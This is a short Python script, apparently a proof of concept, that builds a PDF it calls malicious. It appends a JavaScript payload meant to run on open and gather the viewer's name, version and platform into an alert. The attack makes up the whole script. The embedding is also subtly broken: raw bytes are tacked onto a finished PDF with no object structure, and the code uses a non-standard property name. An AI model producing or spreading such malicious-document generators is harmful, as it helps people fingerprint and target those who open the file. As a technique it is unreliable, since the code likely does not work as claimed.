from fpdf import FPDF

def create_malicious_pdf(output_filename):
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", size=12)
    pdf.cell(200, 10, txt="This is a test PDF with JavaScript.", ln=True, align='C')
    
    # JavaScript payload: Collect system info (User-Agent and OS details)
    js_payload = "var info = 'User-Agent: ' + app.viewerType + ' ' + app.viewerVersion + '\nOS: ' + platformName; app.alert(info);"
    
    # Embed JavaScript into the PDF
    pdf.output(output_filename, dest='F')
    
    with open(output_filename, "ab") as f:
        f.write(b"\n/Names [(EmbeddedJS) << /S /JavaScript /JS (" + js_payload.encode() + b")>>] /OpenAction (EmbeddedJS)\n")
    
    print(f"Malicious PDF '{output_filename}' created successfully.")

if __name__ == "__main__":
    create_malicious_pdf("malicious.pdf")